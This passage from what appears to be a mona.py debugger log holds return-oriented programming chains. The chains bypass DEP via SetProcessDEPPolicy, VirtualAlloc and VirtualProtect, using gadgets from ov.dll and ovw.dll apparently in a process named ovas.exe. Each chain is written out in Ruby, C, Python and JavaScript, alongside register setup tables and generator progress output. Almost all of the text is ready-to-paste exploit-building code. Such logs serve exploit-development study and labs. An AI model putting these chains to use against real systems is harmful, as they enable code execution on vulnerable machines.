                0x5a145c6d,  # skip 4 bytes [ovw.dll]
                0x41414141,  # Filler (compensate)
                0x41414141,  # Filler (compensate)
                0x41414141,  # Filler (compensate)
                0x00000000,  # [-] Unable to find pushad gadget
                0x41414141,  # Filler (RETN offset compensation)
                0x41414141,  # Filler (RETN offset compensation)
                0x41414141,  # Filler (RETN offset compensation)
              ].flatten.pack("V*")
          
              return rop_gadgets
          
            end
          
          
            # Call the ROP chain generator inside the 'exploit' function :
          
          
            rop_chain = create_rop_chain()
          
          
          
          *** [ C ] ***
          
            #define CREATE_ROP_CHAIN(name, ...) \
              int name##_length = create_rop_chain(NULL, ##__VA_ARGS__); \
              unsigned int name[name##_length / sizeof(unsigned int)]; \
              create_rop_chain(name, ##__VA_ARGS__);
          
            int create_rop_chain(unsigned int *buf, unsigned int )
            {
              // rop chain generated with mona.py - www.corelan.be
              unsigned int rop_gadgets[] = {
                0x00000000,  // [-] Unable to find ptr to SetProcessDEPPolicy() (-> to be put in ebp)
                0x5a145c6f,  // POP EBX // POP EBP // RETN 0x0C [ovw.dll] 
                0x5a146004,  // &0x00000000 [ovw.dll]
                0x41414141,  // Filler (compensate)
                0x5a145c6d,  // POP EDI // POP ESI // POP EBX // POP EBP // RETN 0x0C [ovw.dll] 
                0x41414141,  // Filler (RETN offset compensation)
                0x41414141,  // Filler (RETN offset compensation)
                0x41414141,  // Filler (RETN offset compensation)
                0x5a145c6d,  // skip 4 bytes [ovw.dll]
                0x41414141,  // Filler (compensate)
                0x41414141,  // Filler (compensate)
                0x41414141,  // Filler (compensate)
                0x00000000,  // [-] Unable to find pushad gadget
                0x41414141,  // Filler (RETN offset compensation)
                0x41414141,  // Filler (RETN offset compensation)
                0x41414141,  // Filler (RETN offset compensation)
              };
              if(buf != NULL) {
                memcpy(buf, rop_gadgets, sizeof(rop_gadgets));
              };
              return sizeof(rop_gadgets);
            }
          
            // use the 'rop_chain' variable after this call, it's just an unsigned int[]
            CREATE_ROP_CHAIN(rop_chain, );
            // alternatively just allocate a large enough buffer and get the rop chain, i.e.:
            // unsigned int rop_chain[256];
            // int rop_chain_length = create_rop_chain(rop_chain, );
          
          *** [ Python ] ***
          
            def create_rop_chain():
          
              # rop chain generated with mona.py - www.corelan.be
              rop_gadgets = [
                0x00000000,  # [-] Unable to find ptr to SetProcessDEPPolicy() (-> to be put in ebp)
                0x5a145c6f,  # POP EBX # POP EBP # RETN 0x0C [ovw.dll] 
                0x5a146004,  # &0x00000000 [ovw.dll]
                0x41414141,  # Filler (compensate)
                0x5a145c6d,  # POP EDI # POP ESI # POP EBX # POP EBP # RETN 0x0C [ovw.dll] 
                0x41414141,  # Filler (RETN offset compensation)
                0x41414141,  # Filler (RETN offset compensation)
                0x41414141,  # Filler (RETN offset compensation)
                0x5a145c6d,  # skip 4 bytes [ovw.dll]
                0x41414141,  # Filler (compensate)
                0x41414141,  # Filler (compensate)
                0x41414141,  # Filler (compensate)
                0x00000000,  # [-] Unable to find pushad gadget
                0x41414141,  # Filler (RETN offset compensation)
                0x41414141,  # Filler (RETN offset compensation)
                0x41414141,  # Filler (RETN offset compensation)
              ]
              return ''.join(struct.pack('<I', _) for _ in rop_gadgets)
          
            rop_chain = create_rop_chain()
          
          
          
          *** [ JavaScript ] ***
          
            //rop chain generated with mona.py - www.corelan.be
            rop_gadgets = unescape(
              "%u0000%u0000" + // 0x00000000 : ,# [-] Unable to find ptr to SetProcessDEPPolicy() (-> to be put in ebp)
              "%u5c6f%u5a14" + // 0x5a145c6f : ,# POP EBX # POP EBP # RETN 0x0C [ovw.dll] 
              "%u6004%u5a14" + // 0x5a146004 : ,# &0x00000000 [ovw.dll]
              "%u4141%u4141" + // 0x41414141 : ,# Filler (compensate)
              "%u5c6d%u5a14" + // 0x5a145c6d : ,# POP EDI # POP ESI # POP EBX # POP EBP # RETN 0x0C [ovw.dll] 
              "%u4141%u4141" + // 0x41414141 : ,# Filler (RETN offset compensation)
              "%u4141%u4141" + // 0x41414141 : ,# Filler (RETN offset compensation)
              "%u4141%u4141" + // 0x41414141 : ,# Filler (RETN offset compensation)
              "%u5c6d%u5a14" + // 0x5a145c6d : ,# skip 4 bytes [ovw.dll]
              "%u4141%u4141" + // 0x41414141 : ,# Filler (compensate)
              "%u4141%u4141" + // 0x41414141 : ,# Filler (compensate)
              "%u4141%u4141" + // 0x41414141 : ,# Filler (compensate)
              "%u0000%u0000" + // 0x00000000 : ,# [-] Unable to find pushad gadget
              "%u4141%u4141" + // 0x41414141 : ,# Filler (RETN offset compensation)
              "%u4141%u4141" + // 0x41414141 : ,# Filler (RETN offset compensation)
              "%u4141%u4141" + // 0x41414141 : ,# Filler (RETN offset compensation)
              ""); //  : 
          
          
          --------------------------------------------------------------------------------------------------
          
          
          ################################################################################
          
          Register setup for VirtualAlloc() :
          --------------------------------------------
           EAX = NOP (0x90909090)
           ECX = flProtect (0x40)
           EDX = flAllocationType (0x1000)
           EBX = dwSize
           ESP = lpAddress (automatic)
           EBP = ReturnTo (ptr to jmp esp)
           ESI = ptr to VirtualAlloc()
           EDI = ROP NOP (RETN)
           --- alternative chain ---
           EAX = ptr to &VirtualAlloc()
           ECX = flProtect (0x40)
           EDX = flAllocationType (0x1000)
           EBX = dwSize
           ESP = lpAddress (automatic)
           EBP = POP (skip 4 bytes)
           ESI = ptr to JMP [EAX]
           EDI = ROP NOP (RETN)
           + place ptr to "jmp esp" on stack, below PUSHAD
          --------------------------------------------
          
          
          ROP Chain for VirtualAlloc() [(XP/2003 Server and up)] :
          --------------------------------------------------------
          
          *** [ Ruby ] ***
          
            def create_rop_chain()
          
              # rop chain generated with mona.py - www.corelan.be
              rop_gadgets = 
              [
                0x5a123432,  # POP EBP # RETN [ovw.dll] 
                0x5a123432,  # skip 4 bytes [ovw.dll]
                0x5a145c6f,  # POP EBX # POP EBP # RETN 0x0C [ovw.dll] 
                0x00000001,  # 0x00000001-> ebx
                0x41414141,  # Filler (compensate)
                0x5a12b7a4,  # POP EDX # RETN [ovw.dll] 
                0x41414141,  # Filler (RETN offset compensation)
                0x41414141,  # Filler (RETN offset compensation)
                0x41414141,  # Filler (RETN offset compensation)
                0x00001000,  # 0x00001000-> edx
                0x5a145c8d,  # POP ECX # RETN [ovw.dll] 
                0x00000040,  # 0x00000040-> ecx
                0x5a145c6d,  # POP EDI # POP ESI # POP EBX # POP EBP # RETN 0x0C [ovw.dll] 
                0x5a10827c,  # RETN (ROP NOP) [ovw.dll]
                0x41414141,  # Filler (compensate)
                0x41414141,  # Filler (compensate)
                0x41414141,  # Filler (compensate)
                0x5a145c6e,  # POP ESI # POP EBX # POP EBP # RETN 0x0C [ovw.dll] 
                0x41414141,  # Filler (RETN offset compensation)
                0x41414141,  # Filler (RETN offset compensation)
                0x41414141,  # Filler (RETN offset compensation)
                0x5a13e96c,  # JMP [EAX] [ovw.dll]
                0x41414141,  # Filler (compensate)
                0x41414141,  # Filler (compensate)
                0x5a145bd3,  # POP EAX # RETN 0x0C [ovw.dll] 
                0x41414141,  # Filler (RETN offset compensation)
                0x41414141,  # Filler (RETN offset compensation)
                0x41414141,  # Filler (RETN offset compensation)
                0x6d1d408c,  # ptr to &VirtualAlloc() (skipped module criteria, check if pointer is reliable !) [IAT hpi.dll]
                0x00000000,  # [-] Unable to find pushad gadget
                0x41414141,  # Filler (RETN offset compensation)
                0x41414141,  # Filler (RETN offset compensation)
                0x41414141,  # Filler (RETN offset compensation)
                0x5a10a88b,  # ptr to 'jmp esp' [ovw.dll]
              ].flatten.pack("V*")
          
              return rop_gadgets
          
            end
          
          
            # Call the ROP chain generator inside the 'exploit' function :
          
          
            rop_chain = create_rop_chain()
          
          
          
          *** [ C ] ***
          
            #define CREATE_ROP_CHAIN(name, ...) \
              int name##_length = create_rop_chain(NULL, ##__VA_ARGS__); \
              unsigned int name[name##_length / sizeof(unsigned int)]; \
              create_rop_chain(name, ##__VA_ARGS__);
          
            int create_rop_chain(unsigned int *buf, unsigned int )
            {
              // rop chain generated with mona.py - www.corelan.be
              unsigned int rop_gadgets[] = {
                0x5a123432,  // POP EBP // RETN [ovw.dll] 
                0x5a123432,  // skip 4 bytes [ovw.dll]
                0x5a145c6f,  // POP EBX // POP EBP // RETN 0x0C [ovw.dll] 
                0x00000001,  // 0x00000001-> ebx
                0x41414141,  // Filler (compensate)
                0x5a12b7a4,  // POP EDX // RETN [ovw.dll] 
                0x41414141,  // Filler (RETN offset compensation)
                0x41414141,  // Filler (RETN offset compensation)
                0x41414141,  // Filler (RETN offset compensation)
                0x00001000,  // 0x00001000-> edx
                0x5a145c8d,  // POP ECX // RETN [ovw.dll] 
                0x00000040,  // 0x00000040-> ecx
                0x5a145c6d,  // POP EDI // POP ESI // POP EBX // POP EBP // RETN 0x0C [ovw.dll] 
                0x5a10827c,  // RETN (ROP NOP) [ovw.dll]
                0x41414141,  // Filler (compensate)
                0x41414141,  // Filler (compensate)
                0x41414141,  // Filler (compensate)
                0x5a145c6e,  // POP ESI // POP EBX // POP EBP // RETN 0x0C [ovw.dll] 
                0x41414141,  // Filler (RETN offset compensation)
                0x41414141,  // Filler (RETN offset compensation)
                0x41414141,  // Filler (RETN offset compensation)
                0x5a13e96c,  // JMP [EAX] [ovw.dll]
                0x41414141,  // Filler (compensate)
                0x41414141,  // Filler (compensate)
                0x5a145bd3,  // POP EAX // RETN 0x0C [ovw.dll] 
                0x41414141,  // Filler (RETN offset compensation)
                0x41414141,  // Filler (RETN offset compensation)
                0x41414141,  // Filler (RETN offset compensation)
                0x6d1d408c,  // ptr to &VirtualAlloc() (skipped module criteria, check if pointer is reliable !) [IAT hpi.dll]
                0x00000000,  // [-] Unable to find pushad gadget
                0x41414141,  // Filler (RETN offset compensation)
                0x41414141,  // Filler (RETN offset compensation)
                0x41414141,  // Filler (RETN offset compensation)
                0x5a10a88b,  // ptr to 'jmp esp' [ovw.dll]
              };
              if(buf != NULL) {
                memcpy(buf, rop_gadgets, sizeof(rop_gadgets));
              };
              return sizeof(rop_gadgets);
            }
          
            // use the 'rop_chain' variable after this call, it's just an unsigned int[]
            CREATE_ROP_CHAIN(rop_chain, );
            // alternatively just allocate a large enough buffer and get the rop chain, i.e.:
            // unsigned int rop_chain[256];
            // int rop_chain_length = create_rop_chain(rop_chain, );
          
          *** [ Python ] ***
          
            def create_rop_chain():
          
              # rop chain generated with mona.py - www.corelan.be
              rop_gadgets = [
                0x5a123432,  # POP EBP # RETN [ovw.dll] 
                0x5a123432,  # skip 4 bytes [ovw.dll]
                0x5a145c6f,  # POP EBX # POP EBP # RETN 0x0C [ovw.dll] 
                0x00000001,  # 0x00000001-> ebx
                0x41414141,  # Filler (compensate)
                0x5a12b7a4,  # POP EDX # RETN [ovw.dll] 
                0x41414141,  # Filler (RETN offset compensation)
                0x41414141,  # Filler (RETN offset compensation)
                0x41414141,  # Filler (RETN offset compensation)
                0x00001000,  # 0x00001000-> edx
                0x5a145c8d,  # POP ECX # RETN [ovw.dll] 
                0x00000040,  # 0x00000040-> ecx
                0x5a145c6d,  # POP EDI # POP ESI # POP EBX # POP EBP # RETN 0x0C [ovw.dll] 
                0x5a10827c,  # RETN (ROP NOP) [ovw.dll]
                0x41414141,  # Filler (compensate)
                0x41414141,  # Filler (compensate)
                0x41414141,  # Filler (compensate)
                0x5a145c6e,  # POP ESI # POP EBX # POP EBP # RETN 0x0C [ovw.dll] 
                0x41414141,  # Filler (RETN offset compensation)
                0x41414141,  # Filler (RETN offset compensation)
                0x41414141,  # Filler (RETN offset compensation)
                0x5a13e96c,  # JMP [EAX] [ovw.dll]
                0x41414141,  # Filler (compensate)
                0x41414141,  # Filler (compensate)
                0x5a145bd3,  # POP EAX # RETN 0x0C [ovw.dll] 
                0x41414141,  # Filler (RETN offset compensation)
                0x41414141,  # Filler (RETN offset compensation)
                0x41414141,  # Filler (RETN offset compensation)
                0x6d1d408c,  # ptr to &VirtualAlloc() (skipped module criteria, check if pointer is reliable !) [IAT hpi.dll]
                0x00000000,  # [-] Unable to find pushad gadget
                0x41414141,  # Filler (RETN offset compensation)
                0x41414141,  # Filler (RETN offset compensation)
                0x41414141,  # Filler (RETN offset compensation)
                0x5a10a88b,  # ptr to 'jmp esp' [ovw.dll]
              ]
              return ''.join(struct.pack('<I', _) for _ in rop_gadgets)
          
            rop_chain = create_rop_chain()
          
          
          
          *** [ JavaScript ] ***
          
            //rop chain generated with mona.py - www.corelan.be
            rop_gadgets = unescape(
              "%u3432%u5a12" + // 0x5a123432 : ,# POP EBP # RETN [ovw.dll] 
              "%u3432%u5a12" + // 0x5a123432 : ,# skip 4 bytes [ovw.dll]
              "%u5c6f%u5a14" + // 0x5a145c6f : ,# POP EBX # POP EBP # RETN 0x0C [ovw.dll] 
              "%u0001%u0000" + // 0x00000001 : ,# 0x00000001-> ebx
              "%u4141%u4141" + // 0x41414141 : ,# Filler (compensate)
              "%ub7a4%u5a12" + // 0x5a12b7a4 : ,# POP EDX # RETN [ovw.dll] 
              "%u4141%u4141" + // 0x41414141 : ,# Filler (RETN offset compensation)
              "%u4141%u4141" + // 0x41414141 : ,# Filler (RETN offset compensation)
              "%u4141%u4141" + // 0x41414141 : ,# Filler (RETN offset compensation)
              "%u1000%u0000" + // 0x00001000 : ,# 0x00001000-> edx
              "%u5c8d%u5a14" + // 0x5a145c8d : ,# POP ECX # RETN [ovw.dll] 
              "%u0040%u0000" + // 0x00000040 : ,# 0x00000040-> ecx
              "%u5c6d%u5a14" + // 0x5a145c6d : ,# POP EDI # POP ESI # POP EBX # POP EBP # RETN 0x0C [ovw.dll] 
              "%u827c%u5a10" + // 0x5a10827c : ,# RETN (ROP NOP) [ovw.dll]
              "%u4141%u4141" + // 0x41414141 : ,# Filler (compensate)
              "%u4141%u4141" + // 0x41414141 : ,# Filler (compensate)
              "%u4141%u4141" + // 0x41414141 : ,# Filler (compensate)
              "%u5c6e%u5a14" + // 0x5a145c6e : ,# POP ESI # POP EBX # POP EBP # RETN 0x0C [ovw.dll] 
              "%u4141%u4141" + // 0x41414141 : ,# Filler (RETN offset compensation)
              "%u4141%u4141" + // 0x41414141 : ,# Filler (RETN offset compensation)
              "%u4141%u4141" + // 0x41414141 : ,# Filler (RETN offset compensation)
              "%ue96c%u5a13" + // 0x5a13e96c : ,# JMP [EAX] [ovw.dll]
              "%u4141%u4141" + // 0x41414141 : ,# Filler (compensate)
              "%u4141%u4141" + // 0x41414141 : ,# Filler (compensate)
              "%u5bd3%u5a14" + // 0x5a145bd3 : ,# POP EAX # RETN 0x0C [ovw.dll] 
              "%u4141%u4141" + // 0x41414141 : ,# Filler (RETN offset compensation)
              "%u4141%u4141" + // 0x41414141 : ,# Filler (RETN offset compensation)
              "%u4141%u4141" + // 0x41414141 : ,# Filler (RETN offset compensation)
              "%u408c%u6d1d" + // 0x6d1d408c : ,# ptr to &VirtualAlloc() (skipped module criteria, check if pointer is reliable !) [IAT hpi.dll]
              "%u0000%u0000" + // 0x00000000 : ,# [-] Unable to find pushad gadget
              "%u4141%u4141" + // 0x41414141 : ,# Filler (RETN offset compensation)
              "%u4141%u4141" + // 0x41414141 : ,# Filler (RETN offset compensation)
              "%u4141%u4141" + // 0x41414141 : ,# Filler (RETN offset compensation)
              "%ua88b%u5a10" + // 0x5a10a88b : ,# ptr to 'jmp esp' [ovw.dll]
              ""); //  : 
          
          
          --------------------------------------------------------------------------------------------------
          
          
0BADF00D      ROP generator finished
0BADF00D  
0BADF00D  [+] Writing stackpivots to file stackpivot.txt
0BADF00D      Wrote 109 pivots to file 
0BADF00D  [+] Writing suggestions to file rop_suggestions.txt
0BADF00D      Wrote 138 suggestions to file
0BADF00D  [+] Writing results to file rop.txt (1793 interesting gadgets)
0BADF00D      Wrote 1793 interesting gadgets to file
0BADF00D  [+] Writing other gadgets to file rop.txt (8279 gadgets)
0BADF00D      Wrote 8279 other gadgets to file
0BADF00D  Done
0BADF00D  
0BADF00D  [+] This mona.py action took 0:00:41.281000
0BADF00D  [+] Command used:
0BADF00D  !mona rop -m ov.dll
          
          ---------- Mona command started on 2018-10-30 04:53:19 (v2.0, rev 577) ----------
0BADF00D  [+] Processing arguments and criteria
0BADF00D      - Pointer access level : X
0BADF00D      - Only querying modules ov.dll
0BADF00D  [+] Generating module info table, hang on...
0BADF00D      - Processing modules
0BADF00D      - Done. Let's rock 'n roll.
0BADF00D  [+] Preparing output file '_rop_progress_ovas.exe_29032.log'
0BADF00D      - (Re)setting logfile _rop_progress_ovas.exe_29032.log
0BADF00D  [+] Progress will be written to _rop_progress_ovas.exe_29032.log
0BADF00D  [+] Maximum offset : 40
0BADF00D  [+] (Minimum/optional maximum) stackpivot distance : 8
0BADF00D  [+] Max nr of instructions : 6
0BADF00D  [+] Split output into module rop files ? False
0BADF00D  [+] Enumerating 22 endings in 1 module(s)...
0BADF00D      - Querying module ov.dll
0BADF00D      - Search complete :
0BADF00D         Ending : RETN 0x0C, Nr found : 29
0BADF00D         Ending : RETN, Nr found : 1804
0BADF00D         Ending : RETN 0x18, Nr found : 4
0BADF00D         Ending : RETN 0x08, Nr found : 57
0BADF00D         Ending : RETN 0x02, Nr found : 1
0BADF00D         Ending : RETN 0x10, Nr found : 7
0BADF00D         Ending : RETN 0x00, Nr found : 12
0BADF00D         Ending : RETN 0x14, Nr found : 5
0BADF00D         Ending : RETN 0x04, Nr found : 110
0BADF00D      - Filtering and mutating 2029 gadgets
0BADF00D        - Progress update : 500 / 2029 items processed (Tue 2018/10/30 04:53:24 AM) - (24%)
0BADF00D        - Progress update : 1000 / 2029 items processed (Tue 2018/10/30 04:53:27 AM) - (49%)
0BADF00D        - Progress update : 1500 / 2029 items processed (Tue 2018/10/30 04:53:30 AM) - (73%)
0BADF00D        - Progress update : 2000 / 2029 items processed (Tue 2018/10/30 04:53:36 AM) - (98%)
0BADF00D        - Progress update : 2029 / 2029 items processed (Tue 2018/10/30 04:53:37 AM) - (100%)
0BADF00D  [+] Creating suggestions list
0BADF00D  [+] Processing suggestions
0BADF00D  [+] Launching ROP generator
0BADF00D  [+] Attempting to produce rop chain for VirtualProtect
0BADF00D      Tue 2018/10/30 04:53:43 AM: Step 1/7: esi
0BADF00D  [+] Searching from 0x5a000000 to 0x5a06a000
0BADF00D      Tue 2018/10/30 04:53:46 AM: Step 2/7: ebp
0BADF00D      Tue 2018/10/30 04:53:47 AM: Step 3/7: ebx
0BADF00D      Tue 2018/10/30 04:53:47 AM: Step 4/7: edx
0BADF00D      Tue 2018/10/30 04:53:47 AM: Step 5/7: ecx
0BADF00D      Tue 2018/10/30 04:53:47 AM: Step 6/7: edi
0BADF00D      Tue 2018/10/30 04:53:47 AM: Step 7/7: eax
0BADF00D  [+] Attempting to produce rop chain for SetInformationProcess
0BADF00D      Tue 2018/10/30 04:53:47 AM: Step 1/6: ebp
0BADF00D      Tue 2018/10/30 04:53:49 AM: Step 2/6: edx
0BADF00D      Tue 2018/10/30 04:53:49 AM: Step 3/6: ecx
0BADF00D      Tue 2018/10/30 04:53:49 AM: Step 4/6: ebx
0BADF00D      Tue 2018/10/30 04:53:49 AM: Step 5/6: eax
0BADF00D      Tue 2018/10/30 04:53:49 AM: Step 6/6: edi
0BADF00D  [+] Attempting to produce rop chain for SetProcessDEPPolicy
0BADF00D      Tue 2018/10/30 04:53:49 AM: Step 1/3: ebp
0BADF00D      Tue 2018/10/30 04:53:52 AM: Step 2/3: ebx
0BADF00D      Tue 2018/10/30 04:53:52 AM: Step 3/3: edi
0BADF00D  [+] Attempting to produce rop chain for VirtualAlloc
0BADF00D      Tue 2018/10/30 04:53:52 AM: Step 1/7: esi
0BADF00D  [+] Searching from 0x5a000000 to 0x5a06a000
0BADF00D      Tue 2018/10/30 04:53:55 AM: Step 2/7: ebp
0BADF00D      Tue 2018/10/30 04:53:55 AM: Step 3/7: ebx
0BADF00D      Tue 2018/10/30 04:53:55 AM: Step 4/7: edx
0BADF00D      Tue 2018/10/30 04:53:55 AM: Step 5/7: ecx
0BADF00D      Tue 2018/10/30 04:53:55 AM: Step 6/7: edi
0BADF00D      Tue 2018/10/30 04:53:55 AM: Step 7/7: eax
0BADF00D  [+] ROP chains written to file rop_chains.txt
          
          ################################################################################
          
          Register setup for VirtualProtect() :
          --------------------------------------------
           EAX = NOP (0x90909090)
           ECX = lpOldProtect (ptr to W address)
           EDX = NewProtect (0x40)
           EBX = dwSize
           ESP = lPAddress (automatic)
           EBP = ReturnTo (ptr to jmp esp)
           ESI = ptr to VirtualProtect()
           EDI = ROP NOP (RETN)
           --- alternative chain ---
           EAX = ptr to &VirtualProtect()
           ECX = lpOldProtect (ptr to W address)
           EDX = NewProtect (0x40)
           EBX = dwSize
           ESP = lPAddress (automatic)
           EBP = POP (skip 4 bytes)
           ESI = ptr to JMP [EAX]
           EDI = ROP NOP (RETN)
           + place ptr to "jmp esp" on stack, below PUSHAD
          --------------------------------------------
          
          
          ROP Chain for VirtualProtect() [(XP/2003 Server and up)] :
          ----------------------------------------------------------
          
          *** [ Ruby ] ***
          
            def create_rop_chain()
          
              # rop chain generated with mona.py - www.corelan.be
              rop_gadgets = 
              [
                0x5a01f2fe,  # POP EBP # RETN [ov.dll] 
                0x5a01f2fe,  # skip 4 bytes [ov.dll]
                0x5a02ee00,  # POP EBX # RETN 0x10 [ov.dll] 
                0x00000201,  # 0x00000201-> ebx
                0x5a02f76b,  # POP EDX # RETN [ov.dll] 
                0x41414141,  # Filler (RETN offset compensation)
                0x41414141,  # Filler (RETN offset compensation)
                0x41414141,  # Filler (RETN offset compensation)
                0x41414141,  # Filler (RETN offset compensation)
                0x00000040,  # 0x00000040-> edx
                0x5a02f512,  # POP ECX # RETN [ov.dll] 
                0x5a066d89,  # &Writable location [ov.dll]
                0x5a02ef72,  # POP EDI # POP ESI # POP EBX # POP EBP # RETN 0x0C [ov.dll] 
                0x5a02f283,  # RETN (ROP NOP) [ov.dll]
                0x41414141,  # Filler (compensate)
                0x41414141,  # Filler (compensate)
                0x41414141,  # Filler (compensate)
                0x5a01796f,  # POP ESI # POP EBP # RETN [ov.dll] 
                0x41414141,  # Filler (RETN offset compensation)
                0x41414141,  # Filler (RETN offset compensation)
                0x41414141,  # Filler (RETN offset compensation)
                0x5a01da85,  # JMP [EAX] [ov.dll]
                0x41414141,  # Filler (compensate)
                0x5a02eed8,  # POP EAX # RETN 0x0C [ov.dll] 
                0x6d3f8098,  # ptr to &VirtualProtect() (skipped module criteria, check if pointer is reliable !) [IAT jvm.dll]
                0x5a0102f3,  # PUSHAD # ADD AL,5A # POP EBP # RETN [ov.dll] 
                0x41414141,  # Filler (RETN offset compensation)
                0x41414141,  # Filler (RETN offset compensation)
                0x41414141,  # Filler (RETN offset compensation)
                0x5a01d78d,  # ptr to 'jmp esp' [ov.dll]
              ].flatten.pack("V*")
          
              return rop_gadgets
          
            end
          
          
            # Call the ROP chain generator inside the 'exploit' function :
          
          
            rop_chain = create_rop_chain()
          
          
          
          *** [ C ] ***
          
            #define CREATE_ROP_CHAIN(name, ...) \
              int name##_length = create_rop_chain(NULL, ##__VA_ARGS__); \
              unsigned int name[name##_length / sizeof(unsigned int)]; \
              create_rop_chain(name, ##__VA_ARGS__);
          
            int create_rop_chain(unsigned int *buf, unsigned int )
            {
              // rop chain generated with mona.py - www.corelan.be
              unsigned int rop_gadgets[] = {
                0x5a01f2fe,  // POP EBP // RETN [ov.dll] 
                0x5a01f2fe,  // skip 4 bytes [ov.dll]
                0x5a02ee00,  // POP EBX // RETN 0x10 [ov.dll] 
                0x00000201,  // 0x00000201-> ebx
                0x5a02f76b,  // POP EDX // RETN [ov.dll] 
                0x41414141,  // Filler (RETN offset compensation)
                0x41414141,  // Filler (RETN offset compensation)
                0x41414141,  // Filler (RETN offset compensation)
                0x41414141,  // Filler (RETN offset compensation)
                0x00000040,  // 0x00000040-> edx
                0x5a02f512,  // POP ECX // RETN [ov.dll] 
                0x5a066d89,  // &Writable location [ov.dll]
                0x5a02ef72,  // POP EDI // POP ESI // POP EBX // POP EBP // RETN 0x0C [ov.dll] 
                0x5a02f283,  // RETN (ROP NOP) [ov.dll]
                0x41414141,  // Filler (compensate)
                0x41414141,  // Filler (compensate)
                0x41414141,  // Filler (compensate)
                0x5a01796f,  // POP ESI // POP EBP // RETN [ov.dll] 
                0x41414141,  // Filler (RETN offset compensation)
                0x41414141,  // Filler (RETN offset compensation)
                0x41414141,  // Filler (RETN offset compensation)
                0x5a01da85,  // JMP [EAX] [ov.dll]
                0x41414141,  // Filler (compensate)
                0x5a02eed8,  // POP EAX // RETN 0x0C [ov.dll] 
                0x6d3f8098,  // ptr to &VirtualProtect() (skipped module criteria, check if pointer is reliable !) [IAT jvm.dll]
                0x5a0102f3,  // PUSHAD // ADD AL,5A // POP EBP // RETN [ov.dll] 
                0x41414141,  // Filler (RETN offset compensation)
                0x41414141,  // Filler (RETN offset compensation)
                0x41414141,  // Filler (RETN offset compensation)
                0x5a01d78d,  // ptr to 'jmp esp' [ov.dll]
              };
              if(buf != NULL) {
                memcpy(buf, rop_gadgets, sizeof(rop_gadgets));
              };
              return sizeof(rop_gadgets);
            }
          
            // use the 'rop_chain' variable after this call, it's just an unsigned int[]
            CREATE_ROP_CHAIN(rop_chain, );
            // alternatively just allocate a large enough buffer and get the rop chain, i.e.:
            // unsigned int rop_chain[256];
            // int rop_chain_length = create_rop_chain(rop_chain, );
          
          *** [ Python ] ***
          
            def create_rop_chain():
          
              # rop chain generated with mona.py - www.corelan.be
              rop_gadgets = [
                0x5a01f2fe,  # POP EBP # RETN [ov.dll] 
                0x5a01f2fe,  # skip 4 bytes [ov.dll]
                0x5a02ee00,  # POP EBX # RETN 0x10 [ov.dll] 
                0x00000201,  # 0x00000201-> ebx
                0x5a02f76b,  # POP EDX # RETN [ov.dll] 
                0x41414141,  # Filler (RETN offset compensation)
                0x41414141,  # Filler (RETN offset compensation)
                0x41414141,  # Filler (RETN offset compensation)
                0x41414141,  # Filler (RETN offset compensation)
                0x00000040,  # 0x00000040-> edx
                0x5a02f512,  # POP ECX # RETN [ov.dll] 
                0x5a066d89,  # &Writable location [ov.dll]
                0x5a02ef72,  # POP EDI # POP ESI # POP EBX # POP EBP # RETN 0x0C [ov.dll] 
                0x5a02f283,  # RETN (ROP NOP) [ov.dll]
                0x41414141,  # Filler (compensate)
                0x41414141,  # Filler (compensate)
                0x41414141,  # Filler (compensate)
                0x5a01796f,  # POP ESI # POP EBP # RETN [ov.dll] 
                0x41414141,  # Filler (RETN offset compensation)
                0x41414141,  # Filler (RETN offset compensation)
                0x41414141,  # Filler (RETN offset compensation)
                0x5a01da85,  # JMP [EAX] [ov.dll]
                0x41414141,  # Filler (compensate)
                0x5a02eed8,  # POP EAX # RETN 0x0C [ov.dll] 
                0x6d3f8098,  # ptr to &VirtualProtect() (skipped module criteria, check if pointer is reliable !) [IAT jvm.dll]
                0x5a0102f3,  # PUSHAD # ADD AL,5A # POP EBP # RETN [ov.dll] 
                0x41414141,  # Filler (RETN offset compensation)
                0x41414141,  # Filler (RETN offset compensation)
                0x41414141,  # Filler (RETN offset compensation)
                0x5a01d78d,  # ptr to 'jmp esp' [ov.dll]
              ]
              return ''.join(struct.pack('<I', _) for _ in rop_gadgets)
          
            rop_chain = create_rop_chain()
          
          
          
          *** [ JavaScript ] ***
          
            //rop chain generated with mona.py - www.corelan.be
            rop_gadgets = unescape(
              "%uf2fe%u5a01" + // 0x5a01f2fe : ,# POP EBP # RETN [ov.dll] 
              "%uf2fe%u5a01" + // 0x5a01f2fe : ,# skip 4 bytes [ov.dll]
              "%uee00%u5a02" + // 0x5a02ee00 : ,# POP EBX # RETN 0x10 [ov.dll] 
              "%u0201%u0000" + // 0x00000201 : ,# 0x00000201-> ebx
              "%uf76b%u5a02" + // 0x5a02f76b : ,# POP EDX # RETN [ov.dll] 
              "%u4141%u4141" + // 0x41414141 : ,# Filler (RETN offset compensation)
              "%u4141%u4141" + // 0x41414141 : ,# Filler (RETN offset compensation)
              "%u4141%u4141" + // 0x41414141 : ,# Filler (RETN offset compensation)
              "%u4141%u4141" + // 0x41414141 : ,# Filler (RETN offset compensation)
              "%u0040%u0000" + // 0x00000040 : ,# 0x00000040-> edx
              "%uf512%u5a02" + // 0x5a02f512 : ,# POP ECX # RETN [ov.dll] 
              "%u6d89%u5a06" + // 0x5a066d89 : ,# &Writable location [ov.dll]
              "%uef72%u5a02" + // 0x5a02ef72 : ,# POP EDI # POP ESI # POP EBX # POP EBP # RETN 0x0C [ov.dll] 
              "%uf283%u5a02" + // 0x5a02f283 : ,# RETN (ROP NOP) [ov.dll]
              "%u4141%u4141" + // 0x41414141 : ,# Filler (compensate)
              "%u4141%u4141" + // 0x41414141 : ,# Filler (compensate)
              "%u4141%u4141" + // 0x41414141 : ,# Filler (compensate)
              "%u796f%u5a01" + // 0x5a01796f : ,# POP ESI # POP EBP # RETN [ov.dll] 
              "%u4141%u4141" + // 0x41414141 : ,# Filler (RETN offset compensation)
              "%u4141%u4141" + // 0x41414141 : ,# Filler (RETN offset compensation)
              "%u4141%u4141" + // 0x41414141 : ,# Filler (RETN offset compensation)
              "%uda85%u5a01" + // 0x5a01da85 : ,# JMP [EAX] [ov.dll]
              "%u4141%u4141" + // 0x41414141 : ,# Filler (compensate)
              "%ueed8%u5a02" + // 0x5a02eed8 : ,# POP EAX # RETN 0x0C [ov.dll] 
              "%u8098%u6d3f" + // 0x6d3f8098 : ,# ptr to &VirtualProtect() (skipped module criteria, check if pointer is reliable !) [IAT jvm.dll]
              "%u02f3%u5a01" + // 0x5a0102f3 : ,# PUSHAD # ADD AL,5A # POP EBP # RETN [ov.dll] 
              "%u4141%u4141" + // 0x41414141 : ,# Filler (RETN offset compensation)
